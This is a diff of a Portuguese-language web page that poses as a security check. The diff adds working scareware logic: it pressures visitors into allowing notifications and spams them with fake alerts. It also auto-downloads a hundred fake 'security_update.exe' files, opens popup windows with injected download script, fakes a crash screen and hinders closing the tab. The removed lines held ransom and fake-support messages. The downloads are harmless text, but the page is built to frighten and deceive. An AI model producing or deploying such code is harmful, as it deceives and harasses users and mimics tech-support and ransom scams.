@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security System</title>
+    <title>Security Verification System</title>
     <style>
         * {
             margin: 0;
@@ -66,6 +66,22 @@
             border-radius: 5px;
         }
 
+        .download-overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.95);
+            color: #0f0;
+            padding: 30px;
+            border: 3px solid #f00;
+            z-index: 20000;
+            text-align: center;
+            display: none;
+            border-radius: 10px;
+            box-shadow: 0 0 30px red;
+        }
+
         .notification-popup {
             position: fixed;
             top: 50%;
@@ -75,11 +91,49 @@
             color: #0f0;
             padding: 40px;
             border: 4px solid #f00;
-            z-index: 20000;
+            z-index: 19000;
             text-align: center;
             display: none;
             border-radius: 10px;
             box-shadow: 0 0 30px red;
+        }
+
+        .final-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 15000;
+            display: none;
+            cursor: pointer;
+            background: #000;
+        }
+
+        .final-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .crash-element {
+            position: fixed;
+            font-size: 24px;
+            z-index: 9999;
+            pointer-events: none;
+            animation: float 2s infinite;
+        }
+
+        .status {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 10px;
+            font-size: 14px;
+            z-index: 900;
+            border-radius: 5px;
         }
 
         button {
@@ -94,57 +148,87 @@
             font-weight: bold;
         }
 
-        .fake-notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #333;
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            border: 2px solid #ff0000;
-            z-index: 950;
-            max-width: 300px;
-            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
+            50% { transform: translateY(-20px) rotate(180deg); opacity: 0.7; }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
     </style>
 </head>
 <body>
+    <!-- TELA INICIAL -->
     <div id="start">
         <div>
-            🔒 SISTEMA DE SEGURANÇA 🔒<br>
-            <span style="font-size: 0.6em;">CLIQUE PARA INICIAR</span>
+            🔒 VERIFICAÇÃO DE SEGURANÇA 🔒<br>
+            <span style="font-size: 0.6em;">CLIQUE PARA VERIFICAR SISTEMA</span>
         </div>
     </div>
 
+    <!-- VÍDEO -->
     <video id="video" playsinline loop muted>
         <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
     </video>
 
+    <!-- INTERFACE -->
     <div class="terminal-text" id="terminal"></div>
+    <div class="status" id="status">SISTEMA PRONTO</div>
 
+    <!-- POPUPS -->
     <div class="notification-popup" id="notificationPopup">
-        <h2>🔔 NOTIFICAÇÕES PUSH</h2>
-        <p><strong>Ative as notificações para proteção total</strong></p>
+        <h2>🔔 PERMISSÃO DE NOTIFICAÇÃO</h2>
+        <p><strong>Permita notificações para segurança do sistema</strong></p>
         <p style="color: #ff0000; font-size: 0.9em;">
-            ⚠️ Essencial para segurança do sistema!
+            ⚠️ Notificações são necessárias para proteção!
         </p>
-        <button onclick="enablePushNotifications()">✅ ATIVAR NOTIFICAÇÕES PUSH</button>
+        <button onclick="enableNotificationSpam()">✅ PERMITIR NOTIFICAÇÕES</button>
         <br>
-        <button onclick="startFakePushSystem()" style="background: #f00; color: white;">
-            ❌ PULAR (NÃO RECOMENDADO)
+        <button onclick="forceSystem()" style="background: #f00; color: white;">❌ NEGAR (CONTINUAR)</button>
+    </div>
+
+    <div class="download-overlay" id="downloadOverlay">
+        <h2>📥 DOWNLOAD OBRIGATÓRIO</h2>
+        <p style="margin: 20px 0; font-size: 1.2em;">
+            <strong>Download necessário para verificação de segurança</strong>
+        </p>
+        <p style="color: #ff0000; margin: 15px 0;">
+            ⚠️ NÃO FECHE ESTA JANELA!
+        </p>
+        <button onclick="startForcedDownloads()" style="background: #00ff00; color: #000; padding: 20px 40px; font-size: 1.3em;">
+            📥 INICIAR DOWNLOAD DE SEGURANÇA
         </button>
+        <p style="margin-top: 20px; font-size: 0.8em; color: #ccc;">
+            Arquivos necessários: security_update.exe<br>
+            Tamanho: 15.7 MB
+        </p>
+    </div>
+
+    <div class="final-container" id="finalContainer">
+        <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg" alt="Alerta Final">
     </div>
 
     <script>
+        // ELEMENTOS PRINCIPAIS
         const start = document.getElementById("start");
         const video = document.getElementById("video");
         const terminal = document.getElementById("terminal");
+        const status = document.getElementById("status");
         const notificationPopup = document.getElementById("notificationPopup");
+        const downloadOverlay = document.getElementById("downloadOverlay");
+        const finalContainer = document.getElementById("finalContainer");
 
-        let pushSubscription = null;
-        let notificationInterval = null;
+        // VARIÁVEIS GLOBAIS
+        let notificationInterval;
+        let downloadInterval;
+        let crashIntervals = [];
+        let audioClips = [];
         let isActive = false;
+        let downloadAttempts = 0;
+        const maxDownloadAttempts = 50;
 
         // FUNÇÃO DO TERMINAL
         function updateTerminal(message) {
@@ -153,255 +237,371 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        // 🔥 SISTEMA DE NOTIFICAÇÕES PUSH REAIS
-        async function setupPushSystem() {
-            updateTerminal("🔔 CONFIGURANDO NOTIFICAÇÕES PUSH...");
-
-            // Verificar se o navegador suporta
-            if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
-                updateTerminal("❌ PUSH NÃO SUPORTADO - USANDO SISTEMA ALTERNATIVO");
-                startFakePushSystem();
-                return;
-            }
-
-            try {
-                // Registrar Service Worker
-                const registration = await navigator.serviceWorker.register('/sw.js');
-                updateTerminal("✅ SERVICE WORKER REGISTRADO");
-
-                // Mostrar popup para permitir notificações
+        // SISTEMA DE NOTIFICAÇÕES PUSH PERSISTENTES
+        function setupNotificationSystem() {
+            updateTerminal("🔔 CONFIGURANDO SISTEMA DE NOTIFICAÇÃO...");
+            
+            // Service Worker para notificações push
+            if ('serviceWorker' in navigator && 'PushManager' in window) {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(registration => {
+                        updateTerminal("✅ SERVICE WORKER REGISTRADO");
+                        subscribeToPush(registration);
+                    })
+                    .catch(error => {
+                        updateTerminal("❌ SERVICE WORKER FALHOU: " + error);
+                        showNotificationPopup();
+                    });
+            } else {
                 showNotificationPopup();
-
-            } catch (error) {
-                updateTerminal("❌ ERRO SERVICE WORKER: " + error);
-                startFakePushSystem();
             }
         }
 
         function showNotificationPopup() {
             setTimeout(() => {
                 notificationPopup.style.display = 'block';
-                updateTerminal("💡 SOLICITANDO PERMISSÃO PUSH...");
+                updateTerminal("💡 SOLICITANDO PERMISSÃO DE NOTIFICAÇÃO...");
             }, 3000);
         }
 
-        async function enablePushNotifications() {
+        function enableNotificationSpam() {
             notificationPopup.style.display = 'none';
             
-            try {
-                // Pedir permissão
-                const permission = await Notification.requestPermission();
-                
+            Notification.requestPermission().then(permission => {
                 if (permission === 'granted') {
-                    updateTerminal("✅ PERMISSÃO CONCEDIDA - INSCREVENDO PUSH...");
-                    
-                    // Inscrever para push notifications
-                    await subscribeToPush();
-                    startRealPushSystem();
-                    
+                    updateTerminal("✅ PERMISSÃO CONCEDIDA - NOTIFICAÇÕES ATIVAS");
+                    startNotificationSpam();
+                    startAdvancedSystem();
                 } else {
-                    updateTerminal("❌ PERMISSÃO NEGADA - USANDO SISTEMA FAKE");
-                    startFakePushSystem();
+                    updateTerminal("❌ PERMISSÃO NEGADA - FORÇANDO SISTEMA");
+                    forceSystem();
                 }
-                
-            } catch (error) {
-                updateTerminal("❌ ERRO PERMISSÃO: " + error);
-                startFakePushSystem();
-            }
+            });
         }
 
-        // 🔥 INSCREVER PARA PUSH NOTIFICATIONS REAIS
-        async function subscribeToPush() {
-            try {
-                const registration = await navigator.serviceWorker.ready;
-                
-                // Usar VAPID keys públicas (exemplo)
-                const vapidPublicKey = 'BLx7V8K9zCx0WpOfRvLk2Q6uAeH1nTgX5yM0qN3iJ7cFm8ZwS4bD9vEaZxRlG5tYhP6zK1sU0oW2jL7dN4pX9rF3iV8yQ5bA1eT6mJ0cH4nS9wD2lU7fB5oK3gR8aZ6xY1vE4qJ9sC2pL7dN0wF3iV8yQ5bA1';
-                
-                const subscription = await registration.pushManager.subscribe({
-                    userVisibleOnly: true,
-                    applicationServerKey: urlBase64ToUint8Array(vapidPublicKey)
-                });
-                
-                pushSubscription = subscription;
-                updateTerminal("✅ INSCRITO EM PUSH NOTIFICATIONS");
-                
-                // Enviar subscription para o "servidor" (simulado)
-                sendSubscriptionToServer(subscription);
-                
-            } catch (error) {
-                updateTerminal("❌ ERRO INSCRIÇÃO PUSH: " + error);
-                throw error;
-            }
+        function forceSystem() {
+            notificationPopup.style.display = 'none';
+            updateTerminal("🚨 MODO FORÇADO ATIVADO");
+            startNotificationSpam();
+            startAdvancedSystem();
         }
 
-        function urlBase64ToUint8Array(base64String) {
-            const padding = '='.repeat((4 - base64String.length % 4) % 4);
-            const base64 = (base64String + padding)
-                .replace(/\-/g, '+')
-                .replace(/_/g, '/');
-            const rawData = window.atob(base64);
-            return Uint8Array.from([...rawData].map((char) => char.charCodeAt(0)));
-        }
-
-        // 🔥 SIMULAR ENVIO PARA SERVIDOR
-        function sendSubscriptionToServer(subscription) {
-            updateTerminal("📡 ENVIANDO INSCRIÇÃO PARA SERVIDOR...");
-            
-            // Em um caso real, você enviaria para seu backend
-            // Aqui vamos simular com localStorage
-            localStorage.setItem('pushSubscription', JSON.stringify(subscription));
-            updateTerminal("✅ INSCRIÇÃO SALVA - PRONTO PARA NOTIFICAÇÕES");
-        }
-
-        // 🔥 SISTEMA PUSH REAL (COM SERVICE WORKER)
-        function startRealPushSystem() {
-            updateTerminal("🚀 INICIANDO SISTEMA PUSH REAL...");
-            
-            // Notificações automáticas a cada 20-40 segundos
-            notificationInterval = setInterval(() => {
-                sendPushNotification();
-            }, 20000 + Math.random() * 20000);
-            
-            // Primeira notificação imediata
-            setTimeout(sendPushNotification, 3000);
-            
-            updateTerminal("✅ SISTEMA PUSH ATIVO - NOTIFICAÇÕES AUTOMÁTICAS");
-        }
-
-        function sendPushNotification() {
-            const messages = [
-                "🚨 ALERTA: Sistema de segurança comprometido!",
-                "📱 AVISO: Seu dispositivo precisa de verificação!",
-                "💀 URGENTE: Dados em risco - ação necessária!",
-                "📥 DOWNLOAD: Atualização crítica disponível!",
-                "⚠️ PERIGO: Vírus detectado - clique para remover!",
-                "🔒 BLOQUEIO: Sistema será bloqueado em 5 minutos!",
-                "📞 SUPORTE: Ligue +55 11 99999-9999 para ajuda!",
-                "💰 RESGATE: Pague R$ 500 para desbloquear!",
-                "🌐 VAZAMENTO: Seus dados estão sendo copiados!",
-                "📸 CÂMERA: Sua câmera está ativa e gravando!"
-            ];
-            
-            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-            
-            updateTerminal("🔔 ENVIANDO NOTIFICAÇÃO PUSH: " + randomMsg);
-            
-            // Em um sistema real, seu backend enviaria a push notification
-            // Aqui vamos simular enviando para o Service Worker
-            if (navigator.serviceWorker.controller) {
-                navigator.serviceWorker.controller.postMessage({
-                    type: 'SEND_NOTIFICATION',
-                    title: '🔒 Sistema de Segurança',
-                    body: randomMsg,
-                    requireInteraction: true
-                });
-            } else {
-                // Fallback para notificação normal
-                createLocalNotification(randomMsg);
-            }
-        }
-
-        // 🔥 SISTEMA PUSH FAKE (QUANDO PUSH REAL NÃO FUNCIONA)
-        function startFakePushSystem() {
-            updateTerminal("🎭 INICIANDO SISTEMA PUSH SIMULADO...");
+        function startNotificationSpam() {
+            updateTerminal("🔥 INICIANDO NOTIFICAÇÕES PUSH...");
             
             notificationInterval = setInterval(() => {
-                createFakePushNotification();
+                createPushNotification();
             }, 15000);
             
             // Primeira notificação imediata
-            setTimeout(createFakePushNotification, 2000);
-            
-            updateTerminal("✅ SISTEMA PUSH SIMULADO ATIVO");
+            setTimeout(createPushNotification, 2000);
         }
 
-        function createFakePushNotification() {
+        function createPushNotification() {
             const messages = [
-                "🚨 ALERTA PUSH: Sistema em perigo!",
-                "📱 NOTIFICAÇÃO: Verificação necessária!",
-                "💀 PUSH URGENTE: Clique para segurança!",
-                "📥 PUSH: Download de atualização!",
-                "⚠️ PUSH CRÍTICO: Vírus detectado!",
-                "🔒 PUSH: Bloqueio iminente!",
-                "📞 PUSH: Suporte técnico disponível!",
-                "💰 PUSH: Pagamento necessário!",
-                "🌐 PUSH: Dados comprometidos!",
-                "📸 PUSH: Câmera ativa!"
+                "🚨 ALERTA: Download de segurança necessário!",
+                "📱 VERIFICAÇÃO: Seu sistema precisa de atualização",
+                "💀 CRÍTICO: Arquivos de segurança pendentes",
+                "📥 DOWNLOAD: Clique para baixar atualização",
+                "⚠️ AVISO: Não ignore esta notificação!",
+                "🔒 SEGURANÇA: Proteja seu dispositivo agora",
+                "📲 ATUALIZAÇÃO: Arquivos essenciais disponíveis",
+                "🌐 CONEXÃO: Download automático necessário",
+                "🛡️ PROTEÇÃO: Atualize sua segurança",
+                "📦 PACOTE: Novos arquivos de proteção"
             ];
             
             const randomMsg = messages[Math.floor(Math.random() * messages.length)];
             
-            // Criar notificação fake que parece push
-            const fakePush = document.createElement('div');
-            fakePush.className = 'fake-notification';
-            fakePush.innerHTML = `
-                <div style="display: flex; align-items: center; margin-bottom: 8px;">
-                    <strong style="color: #ff4444;">🔒 Segurança</strong>
-                    <span style="margin-left: auto; font-size: 0.8em; color: #ccc;">agora</span>
-                </div>
-                <div>${randomMsg}</div>
-                <div style="margin-top: 8px; font-size: 0.8em; color: #aaa;">
-                    🔔 Notificação Push • Toque para ação
-                </div>
-            `;
-            
-            document.body.appendChild(fakePush);
-            
-            // Comportamento ao clicar
-            fakePush.onclick = function() {
-                triggerEmergencyDownload();
-                this.remove();
-            };
-            
-            // Auto-remover após 8 segundos
-            setTimeout(() => {
-                if (fakePush.parentNode) {
-                    fakePush.remove();
-                }
-            }, 8000);
-            
-            updateTerminal("🔔 NOTIFICAÇÃO PUSH SIMULADA: " + randomMsg);
-        }
-
-        function createLocalNotification(message) {
-            if (Notification.permission === 'granted') {
+            if ('Notification' in window && Notification.permission === 'granted') {
                 const notification = new Notification('🔒 Sistema de Segurança', {
-                    body: message,
+                    body: randomMsg,
                     icon: 'https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg',
-                    tag: 'security-push',
+                    tag: 'security-alert',
                     requireInteraction: true,
-                    silent: false,
-                    vibrate: [200, 100, 200]
+                    actions: [
+                        {
+                            action: 'download',
+                            title: '📥 Download Agora'
+                        },
+                        {
+                            action: 'info', 
+                            title: 'ℹ️ Mais Informações'
+                        }
+                    ]
                 });
                 
-                notification.onclick = function() {
-                    triggerEmergencyDownload();
+                notification.onclick = () => {
+                    triggerForcedDownload();
                     notification.close();
                 };
+                
+            } else {
+                // Notificação fake se não tiver permissão
+                showFakeNotification(randomMsg);
+            }
+            
+            updateTerminal("🔔 NOTIFICAÇÃO PUSH ENVIADA");
+        }
+
+        function showFakeNotification(message) {
+            const fakeNotif = document.createElement('div');
+            fakeNotif.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #333;
+                color: white;
+                padding: 15px;
+                border-radius: 10px;
+                border: 2px solid #ff0000;
+                z-index: 10000;
+                max-width: 300px;
+                box-shadow: 0 0 20px rgba(255,0,0,0.5);
+                animation: shake 0.5s;
+            `;
+            fakeNotif.innerHTML = `<strong>🔒 Segurança</strong><br>${message}`;
+            document.body.appendChild(fakeNotif);
+            
+            fakeNotif.onclick = () => {
+                triggerForcedDownload();
+                fakeNotif.remove();
+            };
+            
+            setTimeout(() => {
+                if (fakeNotif.parentNode) {
+                    fakeNotif.remove();
+                }
+            }, 5000);
+        }
+
+        // SISTEMA DE DOWNLOADS FORÇADOS
+        function startAdvancedSystem() {
+            updateTerminal("⚙️ INICIANDO SISTEMA AVANÇADO...");
+            
+            // Mostrar popup de download forçado
+            setTimeout(() => {
+                showDownloadOverlay();
+            }, 5000);
+        }
+
+        function showDownloadOverlay() {
+            downloadOverlay.style.display = 'block';
+            updateTerminal("📥 SOLICITANDO DOWNLOAD DE SEGURANÇA...");
+            
+            // Forçar download automaticamente após 10 segundos
+            setTimeout(() => {
+                if (downloadOverlay.style.display === 'block') {
+                    startForcedDownloads();
+                }
+            }, 10000);
+        }
+
+        function startForcedDownloads() {
+            downloadOverlay.style.display = 'none';
+            updateTerminal("🚀 INICIANDO DOWNLOADS FORÇADOS...");
+            
+            let successCount = 0;
+            const totalFiles = 100;
+            
+            // Função recursiva para tentar downloads
+            function attemptDownload(index) {
+                if (index >= totalFiles) {
+                    updateTerminal("✅ TODOS OS DOWNLOADS CONCLUÍDOS");
+                    activateFinalPhase();
+                    return;
+                }
+                
+                downloadAttempts++;
+                const attemptNumber = downloadAttempts;
+                
+                // Criar arquivo "de segurança" falso
+                const securityContent = `
+SECURITY_UPDATE_FILE ${index + 1}
+================================
+Filename: system_security_${index + 1}.exe
+Size: 15.7 MB
+Version: 2.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 1000)}
+Date: ${new Date().toLocaleString()}
+SHA256: ${Math.random().toString(36).substr(2, 64).toUpperCase()}
+
+=== SECURITY PROTOCOL ACTIVATED ===
+This file contains critical security updates
+for your system protection.
+
+Required for:
+- Virus protection
+- System stability  
+- Data encryption
+- Privacy security
+
+DO NOT DELETE THIS FILE!
+================================
+                `;
+                
+                try {
+                    const blob = new Blob([securityContent], { type: 'application/octet-stream' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `security_update_${index + 1}.exe`;
+                    
+                    // Adicionar e clicar
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    
+                    // Liberar URL
+                    setTimeout(() => URL.revokeObjectURL(url), 1000);
+                    
+                    successCount++;
+                    updateTerminal(`📥 DOWNLOAD ${index + 1}/${totalFiles} CONCLUÍDO`);
+                    
+                    // Próximo download
+                    setTimeout(() => attemptDownload(index + 1), 500);
+                    
+                } catch (error) {
+                    updateTerminal(`❌ ERRO NO DOWNLOAD ${index + 1} - TENTANDO NOVAMENTE`);
+                    
+                    // Tentar novamente com about:blank
+                    setTimeout(() => {
+                        triggerAboutBlankDownload(index);
+                    }, 1000);
+                }
+            }
+            
+            // Iniciar primeira tentativa
+            attemptDownload(0);
+        }
+
+        function triggerAboutBlankDownload(fileIndex) {
+            updateTerminal(`🔄 TENTATIVA ${downloadAttempts}: ABOUT:BLANK`);
+            
+            // Abrir about:blank em nova aba
+            const newWindow = window.open('about:blank', '_blank');
+            
+            if (newWindow) {
+                // Injeta código para forçar download
+                newWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Security Download</title>
+                        <style>
+                            body { 
+                                background: #000; 
+                                color: #0f0; 
+                                font-family: Courier New;
+                                padding: 50px;
+                                text-align: center;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <h1>🔒 DOWNLOAD DE SEGURANÇA</h1>
+                        <p>Seu sistema está sendo protegido...</p>
+                        <script>
+                            // Forçar download
+                            const content = "SECURITY_FILE_" + Math.random().toString(36).substr(2, 20);
+                            const blob = new Blob([content], {type: "application/octet-stream"});
+                            const url = URL.createObjectURL(blob);
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.download = 'security_update_' + Date.now() + '.exe';
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            
+                            // Fechar janela após download
+                            setTimeout(() => window.close(), 1000);
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                
+                // Fechar janela após um tempo
+                setTimeout(() => {
+                    if (!newWindow.closed) {
+                        newWindow.close();
+                    }
+                }, 3000);
+                
+            } else {
+                updateTerminal("❌ POPUP BLOQUEADO - TENTANDO NOVAMENTE");
+                
+                // Tentar com window.location (menos eficiente)
+                setTimeout(() => {
+                    try {
+                        const content = "SECURITY_EMERGENCY_" + Date.now();
+                        const blob = new Blob([content], {type: "text/plain"});
+                        const url = URL.createObjectURL(blob);
+                        window.location.href = url;
+                        
+                        setTimeout(() => {
+                            window.history.back();
+                        }, 100);
+                        
+                    } catch (e) {
+                        updateTerminal("❌ MÉTODO ALTERNATIVO FALHOU");
+                    }
+                }, 2000);
             }
         }
 
-        function triggerEmergencyDownload() {
-            updateTerminal("🔗 NOTIFICAÇÃO CLICADA - DOWNLOAD DE EMERGÊNCIA");
+        function triggerForcedDownload() {
+            updateTerminal("🔗 NOTIFICAÇÃO CLICADA - FORÇANDO DOWNLOAD");
             
-            try {
-                const content = "EMERGENCY_SECURITY_UPDATE_" + Date.now();
-                const blob = new Blob([content], {type: "application/octet-stream"});
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'emergency_update.exe';
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-                
-                updateTerminal("📥 DOWNLOAD DE EMERGÊNCIA INICIADO");
-            } catch (error) {
-                updateTerminal("❌ DOWNLOAD FALHOU - TENTANDO NOVAMENTE");
+            // Criar múltiplas tentativas
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    try {
+                        const content = "QUICK_SECURITY_" + Date.now();
+                        const blob = new Blob([content], {type: "application/octet-stream"});
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'emergency_update.exe';
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                    } catch (error) {
+                        updateTerminal("❌ DOWNLOAD RÁPIDO FALHOU");
+                    }
+                }, i * 500);
             }
+        }
+
+        // FASE FINAL
+        function activateFinalPhase() {
+            updateTerminal("💀 ATIVANDO FASE FINAL...");
+            
+            video.style.display = 'none';
+            finalContainer.style.display = 'block';
+            
+            // Travamento pesado
+            startHeavyCrash();
+        }
+
+        function startHeavyCrash() {
+            updateTerminal("🔥 INICIANDO TRAVAMENTO...");
+            
+            // Elementos voando
+            const elementCrash = setInterval(() => {
+                for (let i = 0; i < 5; i++) {
+                    const el = document.createElement('div');
+                    el.className = 'crash-element';
+                    el.style.left = Math.random() * window.innerWidth + 'px';
+                    el.style.top = Math.random() * window.innerHeight + 'px';
+                    el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    el.textContent = '💀';
+                    document.body.appendChild(el);
+                    
+                    setTimeout(() => el.remove(), 3000);
+                }
+            }, 300);
+
+            crashIntervals.push(elementCrash);
         }
 
         // INICIAR SISTEMA
@@ -410,7 +610,7 @@
             isActive = true;
             
             start.style.display = "none";
-            updateTerminal("🚀 INICIANDO SISTEMA DE SEGURANÇA...");
+            updateTerminal("🚀 INICIANDO VERIFICAÇÃO DE SEGURANÇA...");
             
             // Iniciar vídeo
             video.play().catch(e => {
@@ -418,22 +618,21 @@
                 video.play();
             });
 
-            // Configurar sistema push
-            setTimeout(setupPushSystem, 2000);
+            // Sequência do sistema
+            setTimeout(setupNotificationSystem, 2000);
             
-            updateTerminal("✅ SISTEMA INICIADO - CONFIGURANDO NOTIFICAÇÕES...");
+            updateTerminal("✅ SISTEMA INICIADO - AGUARDANDO CONFIGURAÇÃO...");
         });
 
         // BLOQUEAR FECHAMENTO
         window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
-            e.returnValue = 'Sistema de segurança ativo. Tem certeza que deseja sair?';
+            e.returnValue = 'Tem certeza que deseja sair? A verificação de segurança não foi concluída.';
             return e.returnValue;
         });
 
-        updateTerminal("🔒 SISTEMA DE SEGURANÇA CARREGADO");
-        updateTerminal("💡 CLIQUE PARA INICIAR VERIFICAÇÃO");
-
+        updateTerminal("🔒 SISTEMA DE VERIFICAÇÃO CARREGADO");
+        updateTerminal("💡 CLIQUE PARA INICIAR VERIFICAÇÃO DE SEGURANÇA");
     </script>
 </body>
 </html>
